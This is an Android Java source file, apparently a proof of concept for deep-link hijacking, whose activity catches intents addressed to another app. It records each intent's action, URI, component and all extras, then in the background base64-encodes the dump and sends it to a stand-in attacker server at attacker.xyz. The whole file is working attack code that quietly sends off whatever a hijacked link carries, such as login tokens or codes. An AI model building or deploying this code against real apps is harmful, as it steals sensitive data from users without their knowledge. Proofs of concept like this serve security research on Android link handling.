package com.example.deeplinkhijackingpoc;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import android.util.Base64;


public class DeepLinkHijackActivity extends AppCompatActivity
{

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button resetButton = findViewById(R.id.resetButton);
        resetButton.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View view)
            {
                DeepLinkHijackActivity.this.reset(view);
            }
        });

        displayHijackedLink();
    }

    public void displayHijackedLink()
    {
        Intent intent = getIntent();

        if (intent != null)
        {
            String fullIntentDump = dumpIntent(intent);

            TextView textView = findViewById(R.id.textView);
            textView.setText(fullIntentDump);

            sendIntentToServer(fullIntentDump);
        }
    }


    private void sendIntentToServer(String intentDump)
    {
        new Thread(() -> {
            try
            {
                // Base64 encode
                String base64 = Base64.encodeToString(
                    intentDump.getBytes("UTF-8"),
                    Base64.NO_WRAP
                );

                // URL encode after base64
                String encodedParam = URLEncoder.encode(base64, "UTF-8");

                String urlString = "https://attacker.xyz/collect?IntentData=" + encodedParam;

                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                conn.getResponseCode(); // trigger request
                conn.disconnect();
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }).start();
    }

    private String dumpIntent(Intent intent)
    {
        StringBuilder sb = new StringBuilder();

        sb.append("Action: ").append(intent.getAction()).append("\n");
        sb.append("Data: ").append(intent.getDataString()).append("\n");
        sb.append("Type: ").append(intent.getType()).append("\n");
        sb.append("Package: ").append(intent.getPackage()).append("\n");
        sb.append("Component: ").append(intent.getComponent()).append("\n");
        sb.append("Flags: ").append(intent.getFlags()).append("\n");
        sb.append("Categories: ").append(intent.getCategories()).append("\n");

        Bundle extras = intent.getExtras();
        if (extras != null)
        {
            sb.append("Extras:\n");
            for (String key : extras.keySet())
            {
                Object value = extras.get(key);
                sb.append("  ").append(key)
                  .append(" = ")
                  .append(String.valueOf(value))
                  .append("\n");
            }
        }

        return sb.toString();
    }



    @Override
    protected void onNewIntent(Intent intent)
    {
        super.onNewIntent(intent);
        this.displayHijackedLink();
    }

    public void reset(View view)
    {
        TextView textView = findViewById(R.id.textView);
        textView.setText("No Deep Link Hijacked");
    }
}
